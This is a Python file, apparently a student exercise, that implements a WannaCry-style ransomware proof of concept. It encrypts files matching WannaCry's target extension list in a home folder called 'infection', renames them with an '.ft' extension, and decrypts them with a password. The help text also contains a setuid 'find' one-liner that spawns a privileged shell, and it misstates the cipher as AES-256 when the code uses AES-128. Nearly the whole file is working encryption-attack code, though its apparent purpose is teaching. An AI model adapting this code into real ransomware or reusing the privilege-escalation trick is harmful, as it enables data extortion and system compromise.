#!/usr/bin/env python3

import os
import base64
import argparse

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

__version__ = '0.1'
__author__ = 'tischmid@student.42berlin.de'
__copyright__ = 'Copyright (c) 2024 tischmid@student.42berlin.de'
__license__ = '''\
The MIT License (MIT)

Copyright (c) 2024 tischmid@student.42berlin.de

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
'''

SILENT = False
DRY_RUN = False
WANNACRY_EXTENSIONS = {
    '.der',
    '.pfx',
    '.key',
    '.crt',
    '.csr',
    '.p12',
    '.pem',
    '.odt',
    '.ott',
    '.sxw',
    '.stw',
    '.uot',
    '.3ds',
    '.max',
    '.3dm',
    '.ods',
    '.ots',
    '.sxc',
    '.stc',
    '.dif',
    '.slk',
    '.wb2',
    '.odp',
    '.otp',
    '.sxd',
    '.std',
    '.uop',
    '.odg',
    '.otg',
    '.sxm',
    '.mml',
    '.lay',
    '.lay6',
    '.asc',
    '.sqlite3',
    '.sqlitedb',
    '.sql',
    '.accdb',
    '.mdb',
    '.db',
    '.dbf',
    '.odb',
    '.frm',
    '.myd',
    '.myi',
    '.ibd',
    '.mdf',
    '.ldf',
    '.sln',
    '.suo',
    '.cs',
    '.c',
    '.cpp',
    '.pas',
    '.h',
    '.asm',
    '.js',
    '.cmd',
    '.bat',
    '.ps1',
    '.vbs',
    '.vb',
    '.pl',
    '.dip',
    '.dch',
    '.sch',
    '.brd',
    '.jsp',
    '.php',
    '.asp',
    '.rb',
    '.java',
    '.jar',
    '.class',
    '.sh',
    '.mp3',
    '.wav',
    '.swf',
    '.fla',
    '.wmv',
    '.mpg',
    '.vob',
    '.mpeg',
    '.asf',
    '.avi',
    '.mov',
    '.mp4',
    '.3gp',
    '.mkv',
    '.3g2',
    '.flv',
    '.wma',
    '.mid',
    '.m3u',
    '.m4u',
    '.djvu',
    '.svg',
    '.ai',
    '.psd',
    '.nef',
    '.tiff',
    '.tif',
    '.cgm',
    '.raw',
    '.gif',
    '.png',
    '.bmp',
    '.jpg',
    '.jpeg',
    '.vcd',
    '.iso',
    '.backup',
    '.zip',
    '.rar',
    '.7z',
    '.gz',
    '.tgz',
    '.tar',
    '.bak',
    '.tbk',
    '.bz2',
    '.PAQ',
    '.ARC',
    '.aes',
    '.gpg',
    '.vmx',
    '.vmdk',
    '.vdi',
    '.sldm',
    '.sldx',
    '.sti',
    '.sxi',
    '.602',
    '.hwp',
    '.snt',
    '.onetoc2',
    '.dwg',
    '.pdf',
    '.wk1',
    '.wks',
    '.123',
    '.rtf',
    '.csv',
    '.txt',
    '.vsdx',
    '.vsd',
    '.edb',
    '.eml',
    '.msg',
    '.ost',
    '.pst',
    '.potm',
    '.potx',
    '.ppam',
    '.ppsx',
    '.ppsm',
    '.pps',
    '.pot',
    '.pptm',
    '.pptx',
    '.ppt',
    '.xltm',
    '.xltx',
    '.xlc',
    '.xlm',
    '.xlt',
    '.xlw',
    '.xlsb',
    '.xlsm',
    '.xlsx',
    '.xls',
    '.dotx',
    '.dotm',
    '.dot',
    '.docm',
    '.docb',
    '.docx',
    '.doc',
}

def log(msg: str, level: str = 'INFO', force_print=False) -> None:
    if not SILENT or force_print:
        level = level.upper().strip()
        if level == 'INFO':
            clr = '0'
        elif level == 'WARNING':
            clr = '33'
        elif level == 'ERROR':
            clr = '31'
        elif level == 'SUCCESS':
            clr = '32'
        else:
            clr = '0'
        print(f'\033[{clr}m{level}: {msg}\033[m')

def encrypt_file(file_path: str, f) -> None:
    if DRY_RUN:
        log(f'DRY RUN: Encrypting file "{file_path}"', 'INFO')
        return
    else:
        log(f'Encrypting file "{file_path}"', 'INFO')
    with open(file_path, 'rb') as orig_file:
        try:
            cipher = f.encrypt(orig_file.read())
        except Exception as e:
            log(f'An error occured encrypting file "{file_path}": {e}', 'WARNING')
            return
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(cipher)
    os.rename(file_path, file_path + '.ft')

def decrypt_file(file_path: str, f) -> None:
    if DRY_RUN:
        log(f'DRY RUN: Decrypting file "{file_path}"', 'INFO')
        return
    else:
        log(f'Decrypting file "{file_path}"', 'INFO')
    if not file_path.endswith('.ft'):
        log(f'File "{file_path}" doesn\'t end with ".ft"', 'WARNING')
        return
    with open(file_path, 'rb') as encrypted_file:
        try:
            plaintext = f.decrypt(encrypted_file.read())
        except Exception as e:
            log(f'An error occured decrypting file "{file_path}": {e}', 'WARNING')
            return
    with open(file_path, 'wb') as decrypted_file:
        decrypted_file.write(plaintext)
    os.rename(file_path, file_path.removesuffix('.ft'))

if __name__ == '__main__':
    parser = argparse.ArgumentParser(
        prog='stockholm',
        description='WannaCry like ransomware POC - run at your own risk',
        usage='%(prog)s [options] <password>',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''\
IMPORTANT NOTICE:
Running this program will ENCRYPT (or decrypt if -r/--reverse is specified) ALL REGULAR FILES ENDING IN
the extension that wannacry would've encrypted in the folder called `infection' inside the HOME directory of
the user whose UID is the same as the REAL UID that is running this program, using AES-256-CBC with <password>
E.g.:
    - $ $(prog)s      will encrypt files in ~/infection,
    - $ sudo $(prog)s will encrypt files in ~root/infection,
    - $ sudo cp $(which find) ~/find && sudo chmod u+s ~/find && ~/find -exec bash -p -c '%(prog)s' \; -quit ; sudo rm -f ~/find
        - will encrypt files in ~/infection, although it's run with root privileges
        '''
    )

    parser.add_argument('password', help='The 16 character (or more) password used for encryption or decryption')
    parser.add_argument('-v', '--version', action='version', version=f'%(prog)s {__version__}')
    parser.add_argument('-r', '--reverse', action='store_true', help='Decrypt files using <password> (instead of encrypting)')
    parser.add_argument('-s', '--silent', action='store_true', help='Do not print which files were encrypted/decrypted')
    parser.add_argument('-u', '--dry-run', action='store_true', help='Do not encrypt/decrypt, just print what would be done')
    args = parser.parse_args()

    SILENT = args.silent
    DRY_RUN = args.dry_run
    password = args.password
    if len(password) < 16:
        log(f'Password "{password}" must be at least 16 characters', 'ERROR', force_print=True)
        raise SystemExit(1)
    users_home = os.path.expanduser('~')
    crypt_path = os.path.join(users_home, 'infection')
    if not os.path.isdir(crypt_path):
        log(f'Directory "{crypt_path}" does not exist', 'ERROR', force_print=True)
        raise SystemExit(1)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=b'static',
        iterations=100000
    )
    key = base64.urlsafe_b64encode(kdf.derive(password.encode('utf-8')))
    f = Fernet(key) # AES-128-CBC, PKCS7 padding
    for root, dirs, files in os.walk(crypt_path):
        for file in files:
            file_path = os.path.join(root, file)
            if os.path.isfile(file_path):
                if args.reverse:
                    if file_path.endswith('.ft'):
                        decrypt_file(file_path, f)
                else:
                    if file_path.endswith(tuple(WANNACRY_EXTENSIONS)):
                        encrypt_file(file_path, f)
